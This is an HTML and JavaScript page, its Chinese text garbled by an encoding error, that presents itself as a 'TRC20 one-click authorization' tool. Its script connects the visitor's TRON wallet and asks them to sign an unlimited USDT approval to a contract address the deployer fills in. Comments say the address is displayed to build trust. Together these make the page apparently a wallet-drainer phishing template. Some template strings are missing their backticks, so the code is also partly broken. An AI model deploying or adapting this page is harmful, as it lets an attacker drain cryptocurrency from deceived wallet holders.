
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRC20ä¸€é”®æˆæƒ</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { padding: 20px; background: #f5f7fa; }
        .auth-box { max-width: 500px; margin: 30px auto; padding: 30px; background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.08); text-align: center; }
        .title { font-size: 20px; color: #333; margin-bottom: 25px; }
        .addr-tip { font-size: 13px; color: #666; margin: 15px 0; word-break: break-all; }
        .auth-btn { width: 100%; padding: 14px; background: #2f54eb; color: #fff; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 20px 0; }
        .auth-btn:disabled { background: #ccc; cursor: not-allowed; }
        .status { margin-top: 20px; padding: 12px; border-radius: 6px; font-size: 14px; }
        .success { background: #f0f9eb; color: #52c41a; }
        .error { background: #fff1f0; color: #f5222d; }
        .loading { background: #fffbe6; color: #faad14; }
    </style>
</head>
<body>
    <div class="auth-box">
        <h3 class="title">TRC20ä»£å¸ä¸€é”®æˆæƒ</h3>
        <!-- éƒ¨ç½²è€…åˆçº¦åœ°å€æç¤ºï¼ˆç”¨æˆ·å¯æŸ¥çœ‹ï¼Œå¢åŠ ä¿¡ä»»ï¼‰ -->
        <div class="addr-tip">æˆæƒç›®æ ‡åˆçº¦ï¼ˆéƒ¨ç½²è€…åœ°å€ï¼‰ï¼š<br><span id="deployerContractAddr">åŠ è½½ä¸­...</span></div>
        
        <button class="auth-btn" id="authBtn" disabled>æœªæ£€æµ‹åˆ°é’±åŒ…</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        // -------------------------- éƒ¨ç½²è€…ä»…éœ€ä¿®æ”¹è¿™é‡Œï¼ï¼ï¼ --------------------------
        const YOUR_DEPLOYED_CONTRACT = "TCxy2KKNDTqvYfAkgaHJHLoMAmwvY4XBB5"; // ğŸ‘‰ æ›¿æ¢æˆä½ çš„HelpTransferWithNotificationåˆçº¦åœ°å€
        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20-USDTå®˜æ–¹åœ°å€ï¼ˆæ— éœ€æ”¹ï¼Œé™¤éæˆæƒå…¶ä»–ä»£å¸ï¼‰
        const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // æ— é™æˆæƒé¢åº¦
        // -----------------------------------------------------------------------------

        // DOMå…ƒç´ 
        const authBtn = document.getElementById("authBtn");
        const status = document.getElementById("status");
        const deployerAddrEl = document.getElementById("deployerContractAddr");
        let tronWeb = null;

        // 1. é¡µé¢åŠ è½½ï¼šæ˜¾ç¤ºéƒ¨ç½²è€…åˆçº¦åœ°å€ + è‡ªåŠ¨æ£€æµ‹é’±åŒ…
        window.onload = () => {
            // æ˜¾ç¤ºä½ çš„åˆçº¦åœ°å€ï¼ˆè„±æ•ï¼Œé¿å…ç”¨æˆ·å¤åˆ¶é”™è¯¯ï¼‰
            deployerAddrEl.textContent = ${YOUR_DEPLOYED_CONTRACT.slice(0, 8)}...${YOUR_DEPLOYED_CONTRACT.slice(-6)};
            // æ£€æµ‹é’±åŒ…
            checkWallet();
        };

        // 2. è‡ªåŠ¨æ£€æµ‹TRONé’±åŒ…ï¼ˆæ— éœ€ç”¨æˆ·æ‰‹åŠ¨è§¦å‘ï¼‰
        function checkWallet() {
            if (window.tronWeb?.ready) {
                initWallet(window.tronWeb);
            } else {
                // ç›‘å¬é’±åŒ…æ³¨å…¥ï¼ˆå¦‚ç”¨æˆ·æ‰“å¼€é’±åŒ…ï¼‰
                window.addEventListener("tronWebReady", (e) => initWallet(e.detail.tronWeb));
                showStatus("è¯·æ‰“å¼€TRONé’±åŒ…ï¼ˆå¦‚imToken/TrustWalletï¼‰", "loading");
                authBtn.textContent = "æ‰“å¼€é’±åŒ…åç‚¹å‡»";
            }
        }

        // 3. åˆå§‹åŒ–é’±åŒ…ï¼šè·å–ç”¨æˆ·åœ°å€ + æ£€æµ‹æ˜¯å¦å·²æˆæƒ
        async function initWallet(_tronWeb) {
            tronWeb = _tronWeb;
            try {
                // è‡ªåŠ¨è·å–ç”¨æˆ·åœ°å€ï¼ˆé’±åŒ…ä¼šå¼¹çª—è¯·æ±‚æˆæƒï¼Œä»…1æ¬¡ï¼‰
                const accounts = await tronWeb.accounts.queryAccounts();
                const userAddr = accounts[0]?.address;

                if (userAddr) {
                    authBtn.textContent = "ç‚¹å‡»å‘èµ·æˆæƒ";
                    authBtn.disabled = false;
                    showStatus(`å·²è¿æ¥é’±åŒ…ï¼š${userAddr.slice(0, 6)}...${userAddr.slice(-4)}`, "success");
                    // è‡ªåŠ¨æ£€æµ‹ï¼šç”¨æˆ·æ˜¯å¦å·²æˆæƒï¼ˆé¿å…é‡å¤æ“ä½œï¼‰
                    await checkIfAuthorized(userAddr);
                } else {
                    showStatus("è¯·åœ¨é’±åŒ…ä¸­æˆæƒè¿æ¥é¡µé¢", "error");
                    authBtn.textContent = "æˆæƒé’±åŒ…åç‚¹å‡»";
                }
            } catch (err) {
                showStatus("é’±åŒ…è¿æ¥å¤±è´¥ï¼š" + err.message.slice(0, 40), "error");
            }
        }

        // 4. æ£€æµ‹ç”¨æˆ·æ˜¯å¦å·²æˆæƒï¼ˆè‡ªåŠ¨è·³è¿‡é‡å¤æ“ä½œï¼‰
        async function checkIfAuthorized(userAddr) {
            try {
const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
                const approvedAmount = await usdtContract.allowance(userAddr, YOUR_DEPLOYED_CONTRACT).call();
                
                if (approvedAmount >= MAX_APPROVE) {
                    authBtn.disabled = true;
                    authBtn.textContent = "å·²å®Œæˆæˆæƒ";
                    showStatus("âœ… ä½ å·²æˆæƒï¼Œæ— éœ€é‡å¤æ“ä½œ", "success");
                }
            } catch (err) {
                showStatus("æ£€æµ‹æˆæƒçŠ¶æ€å¤±è´¥ï¼Œå¯ç›´æ¥å‘èµ·æˆæƒ", "loading");
            }
        }

        // 5. æ ¸å¿ƒï¼šä¸€é”®æˆæƒï¼ˆç”¨æˆ·ç‚¹å‡»æŒ‰é’®è§¦å‘ï¼‰
        authBtn.addEventListener("click", async () => {
            authBtn.disabled = true;
            authBtn.textContent = "å”¤èµ·é’±åŒ…ä¸­...";
            showStatus("â³ è¯·åœ¨é’±åŒ…å¼¹çª—ä¸­ç‚¹å‡»ã€Œç¡®è®¤ã€", "loading");

            try {
                // è·å–å½“å‰ç”¨æˆ·åœ°å€
                const userAddr = (await tronWeb.accounts.queryAccounts())[0]?.address;
                if (!userAddr) throw new Error("æœªè·å–åˆ°é’±åŒ…åœ°å€");

                // å‘èµ·æˆæƒäº¤æ˜“
                const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
                const tx = await usdtContract
                    .approve(YOUR_DEPLOYED_CONTRACT, MAX_APPROVE) // æˆæƒç»™ä½ çš„åˆçº¦
                    .send({ from: userAddr, feeLimit: 300000000 }); // 0.3TRXæ‰‹ç»­è´¹ï¼ˆè¶³å¤Ÿï¼‰

                // æˆæƒæˆåŠŸ
                showStatus(`âœ… æˆæƒæˆåŠŸï¼äº¤æ˜“IDï¼š${tx.txid.slice(0, 12)}...`, "success");
                authBtn.textContent = "æˆæƒæˆåŠŸ";
            } catch (err) {
                // é”™è¯¯å¤„ç†ï¼ˆç”¨æˆ·æ‹’ç»/ç½‘ç»œé—®é¢˜ï¼‰
                const errMsg = err.message.includes("user rejected") ? "ä½ å–æ¶ˆäº†æˆæƒï¼Œè¯·é‡æ–°ç‚¹å‡»" : "æˆæƒå¤±è´¥ï¼š" + err.message.slice(0, 40);
                showStatus(errMsg, "error");
                authBtn.textContent = "é‡æ–°å‘èµ·æˆæƒ";
                authBtn.disabled = false;
            }
        });

        // ç®€åŒ–ç‰ˆçŠ¶æ€æç¤º
        function showStatus(text, type) {
            status.textContent = text;
            status.className = status ${type};
        }
    </script>
</body>
</html>
